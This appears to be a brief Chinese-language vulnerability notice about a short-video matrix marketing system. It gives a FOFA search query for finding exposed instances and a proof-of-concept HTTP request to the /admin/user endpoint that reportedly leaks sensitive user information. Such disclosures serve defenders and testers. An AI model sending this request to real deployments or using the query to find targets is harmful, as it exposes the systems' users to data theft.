**fofa**

```
title="短视频矩阵营销系统"
```

**一、漏洞简述**

短视频矩阵系统是一种整合多平台短视频内容发布和管理的工具，旨在通过统一的后台实现对视频素材的高效管理、编辑和分发。该系统能够支持多个社交媒体平台的账号同步，优化视频营销策略，提高品牌曝光率，并通过数据分析帮助用户深入了解受众偏好，从而提升内容创作的针对性和效果。其接口user存在敏感信息泄露漏洞，攻击者可通过该漏洞获取系统敏感信息。

二、漏洞检测poc

```yaml
POST /index.php/admin/user/index.html?page=1 HTTP/2Host: x.x.x.xUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Content-Length: 0
```

